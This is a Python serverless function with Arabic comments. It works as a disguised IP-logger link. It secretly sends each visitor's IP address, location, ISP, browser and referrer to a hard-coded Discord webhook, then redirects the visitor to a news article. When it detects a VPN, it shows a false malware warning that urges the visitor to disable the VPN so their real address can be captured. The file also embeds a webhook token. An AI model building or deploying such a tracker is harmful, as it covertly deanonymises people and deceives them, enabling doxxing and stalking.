import json
import requests
from datetime import datetime

DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1397615981613809776/dO4Lcv7dBOPHDCp4O6BcrE9CbvHjnRWJEqsZ2wQzhxxmyFKvcGTkU7FrHwHCGgqmVhPG"  # <-- ضع رابطك هنا
REDIRECT_URL = "https://jo24.net/article/539190"

def handler(event, context):
    headers = event.get("headers", {})
    ip = headers.get("x-forwarded-for", event.get("requestContext", {}).get("identity", {}).get("sourceIp", "unknown"))
    user_agent = headers.get("user-agent", "unknown")
    referrer = headers.get("referer", "unknown")

    # تحقق من الـ VPN عبر ipapi
    try:
        geo = requests.get(f"https://ipapi.co/{ip}/json/").json()
        country = geo.get("country_name", "Unknown")
        country_code = geo.get("country_code", "").lower()
        city = geo.get("city", "")
        region = geo.get("region", "")
        org = geo.get("org", "")
        is_vpn = geo.get("proxy", False) or geo.get("vpn", False)
    except:
        country = city = region = org = "Unknown"
        is_vpn = False

    time_str = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    embed = {
        "title": "📥 زائر جديد",
        "color": 0x3498db,
        "thumbnail": {"url": f"https://flagcdn.com/w80/{country_code}.png"} if country_code else {},
        "fields": [
            {"name": "🕒 الوقت", "value": time_str, "inline": False},
            {"name": "🌍 الدولة", "value": f"{country}, {city} ({region})", "inline": True},
            {"name": "🔌 المنظمة", "value": org or "غير معروفة", "inline": True},
            {"name": "🌐 IP", "value": ip, "inline": False},
            {"name": "🖥️ المتصفح", "value": user_agent, "inline": False},
            {"name": "🔗 مصدر الدخول", "value": referrer or "غير معروف", "inline": False},
            {"name": "🛡️ VPN/Proxy", "value": "نعم" if is_vpn else "لا", "inline": True},
        ]
    }

    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
    except:
        pass

    # إذا تم الكشف عن VPN → عرض رسالة
    if is_vpn:
        html = """
        <html lang="ar" dir="rtl"><head><meta charset="utf-8"><title>تحذير</title></head>
        <body style="background:#111;color:#f44;font-family:sans-serif;text-align:center;padding:40px">
        <h1>⚠️ تم الكشف عن VPN</h1>
        <p>يرجى إيقاف الـ VPN لحماية جهازك من الفيروسات والبرمجيات الخبيثة.</p>
        </body></html>
        """
        return {
            "statusCode": 200,
            "headers": {"Content-Type": "text/html"},
            "body": html
        }

    # غير VPN → إعادة التوجيه
    return {
        "statusCode": 302,
        "headers": {"Location": REDIRECT_URL},
        "body": ""
    }
